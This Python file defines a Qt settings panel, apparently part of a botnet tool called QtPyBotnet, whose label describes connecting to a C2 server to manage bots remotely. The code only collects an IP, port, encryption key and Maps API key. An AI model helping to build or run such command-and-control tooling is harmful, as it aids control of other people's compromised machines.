from qtpy.QtCore import (Slot)
from qtpy.QtWidgets import (QWidget, QVBoxLayout, QLineEdit, QComboBox,
                            QFormLayout, QLabel, QSpinBox, QSizePolicy, QSpacerItem)

from .ConfigBaseFrame import ConfigBaseFrame


class GUIConfigFrame(ConfigBaseFrame):

    def __init__(self, parent):
        super(GUIConfigFrame, self).__init__(parent)
        self.widget_layout = QVBoxLayout(self)
        self.setLayout(self.widget_layout)

        self.gui_conf_label = QLabel(self)
        self.gui_conf_label.setText("GUI server configuration")
        self.widget_layout.addWidget(self.gui_conf_label)

        self.desc_label = QLabel(self)
        self.desc_label.setWordWrap(True)
        self.desc_label.setText("QtPyBotnet GUI if fully remote. This means that you can connect to C2 server and "
                                "manage bots wherever you are. To authenticate when connecting to GUI server use the "
                                "key below.")
        self.widget_layout.addWidget(self.desc_label)

        self.gui_config = QWidget(self)
        self.gui_config_layout = QFormLayout(self.gui_config)
        self.widget_layout.addWidget(self.gui_config)

        self.gui_ip_label = QLabel(self.gui_config)
        self.gui_ip_label.setObjectName("gui_ip_label")
        self.gui_ip_label.setText("GUI IP Address")

        self.gui_ip_combo = QComboBox(self.gui_config)
        self.gui_config_layout.addRow(self.gui_ip_label, self.gui_ip_combo)

        self.gui_port_label = QLabel(self.gui_config)
        self.gui_port_label.setObjectName("gui_port_label")
        self.gui_port_label.setText("GUI Port")

        self.gui_port_edit = QSpinBox(self.gui_config)
        self.gui_port_edit.setObjectName("gui_port_spin")
        self.gui_port_edit.setRange(1024, 65535)
        self.gui_port_edit.setValue(15692)
        self.gui_config_layout.addRow(self.gui_port_label, self.gui_port_edit)

        self.gui_key_label = QLabel(self.gui_config)
        self.gui_key_label.setObjectName("gui_key_label")
        self.gui_key_label.setText("GUI encryption key")

        self.gui_key_edit = QLineEdit(self.gui_config)
        self.gui_key_edit.setObjectName("gui_key_edit")
        self.gui_key_edit.setReadOnly(True)
        self.gui_config_layout.addRow(self.gui_key_label, self.gui_key_edit)

        self.gmaps_key_label = QLabel(self.gui_config)
        self.gmaps_key_label.setObjectName("gmaps_key_label")
        self.gmaps_key_label.setText("Google Maps API key")

        self.gmap_key_edit = QLineEdit(self.gui_config)
        self.gmap_key_edit.setObjectName("gmap_key_edit")
        self.gui_config_layout.addRow(self.gmaps_key_label, self.gmap_key_edit)

        spacerItem = QSpacerItem(20, 40, QSizePolicy.Minimum, QSizePolicy.Expanding)
        self.widget_layout.addItem(spacerItem)

    @Slot(dict)
    def set_options(self, options):
        self.gui_ip_combo.addItems([iface.get("ip") for iface in options.get("interfaces")])
        self.gui_key_edit.setText(options.get("gui_key"))

    @Slot()
    def collect_info(self):
        return {"gui_ip": self.gui_ip_combo.currentText(),
                "gui_port": int(self.gui_port_edit.text()),
                "gmaps_key": self.gmap_key_edit.text(),
                "gui_key": self.gui_key_edit.text()}
